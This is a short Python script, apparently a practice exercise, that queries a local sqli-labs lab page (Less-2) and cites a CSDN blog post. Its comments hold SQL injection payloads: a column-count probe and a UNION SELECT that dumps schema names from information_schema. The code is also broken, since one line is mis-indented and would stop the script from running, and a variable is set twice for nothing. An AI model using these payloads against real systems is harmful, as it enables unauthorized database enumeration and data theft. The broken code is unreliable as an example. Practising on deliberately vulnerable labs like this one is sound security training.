import urllib.parse
import urllib.request
if __name__ == '__main__':

    url = "http://localhost/sqli-labs-master/Less-2"

    value={}

    data = urllib.parse.urlencode(value).encode('utf-8')

    data = urllib.parse.urlencode(value)
    # req = url + '?' + "id=1%20and%201=2%20order%20by%203"
    # req = url + '?' + "id=1%20and%201=2%20union%20select%201,2,(select%20group_concat(schema_name)%20from%20information_schema.schemata)%20--+"
      req = url + '?' + ""
    response = urllib.request.urlopen(req)
    print(type(response))
    print("==================================")
    print(response.status)
    print("==================================")
    print("")

    the_page = response.read()

    print(the_page.decode("unicode_escape"))
    
    #https://blog.csdn.net/sinat_38682860/article/details/107982932